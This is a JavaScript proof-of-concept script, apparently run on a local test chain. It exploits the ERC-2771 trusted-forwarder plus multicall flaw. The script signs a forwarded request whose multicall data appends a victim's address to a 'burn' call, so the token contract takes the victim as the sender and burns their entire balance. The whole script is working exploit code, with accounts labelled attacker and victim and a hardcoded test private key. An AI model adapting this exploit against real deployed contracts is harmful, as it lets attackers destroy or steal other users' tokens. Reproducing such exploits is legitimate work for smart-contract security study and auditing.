const Web3 = require('web3');
const web3 = new Web3('http://localhost:8545'); // Replace with your Ethereum node URL


  async  function  main() {  

const eee=require('@metamask/eth-sig-util');
  const fs = require('fs');

const json = fs.readFileSync('../out/Counter.sol/MyContract.json', 'utf8');
const contract = JSON.parse(json);

const tokenABI = contract.abi;

const forwardjson = fs.readFileSync('../out/Forward.sol/Forwarder.json', 'utf8');
const forwardcontract = JSON.parse(forwardjson);

const forwardtokenABI = forwardcontract.abi;


  const  token='0x9A676e781A523b5d0C0e43731313A708CB607508';
// Replace with your contract's ABI
const ForwarderAddress = '0x0DCd1Bf9A1b36cE34237eEaFef220932846BCD82'; // Replace with your contract's address

const Forwarder = new web3.eth.Contract(forwardtokenABI, ForwarderAddress);

const attacker = '0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC'; // Replace with the account you want to call the function from

const victim = '0x70997970C51812dc3A010C7d01b50e0d17dc79C8'; // Replace with the account you want to call the function from


const tokencontract = new web3.eth.Contract(tokenABI, token);



async function getid()
{

    let id=  await web3.eth.net.getId();
    return id;

}

const domain = {
    name: 'GSNv2 Forwarder',
    version: '0.0.1',
    chainId:  31337,
    verifyingContract: ForwarderAddress,
};


const types = {
    ForwareRequest: [
        { name: 'from', type: 'address' },
        { name: 'to', type: 'address' },
        { name: 'value', type: 'uint256' },
        { name: 'gas', type: 'uint256' },
        { name: 'nonce', type: 'uint256' },
        { name: 'data', type: 'bytes' },
    ],};



  //  const balance=  token.methods.balanceOf(victim);
   ethers=require('ethers');
  const myContractInterface = new ethers.utils.Interface(tokenABI);


const attackprivatekey='0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a';

const balance=await tokencontract.methods.balanceOf('0x70997970C51812dc3A010C7d01b50e0d17dc79C8').call();
    

console.log(balance)

    const data1 = {
        from: attacker,
        to: token,
        value: 0,
        gas: 100000,
        nonce: await Forwarder.methods.getNonce(attacker).call(),
        data: myContractInterface.encodeFunctionData('multicall', [[
            ethers.utils.concat([myContractInterface.encodeFunctionData('burn', [balance]),
            victim,
        ])
        ]])

    }

    const wallet = new ethers.Wallet(attackprivatekey);

    async function executeData() {
        const signature = await wallet._signTypedData(domain, types, data1);
      //  console.log(signature)
      console.log(data1)

        await Forwarder.methods.execute(data1, signature).send({from: attacker, gas: 100000})
    }

    executeData();

  }
  main();


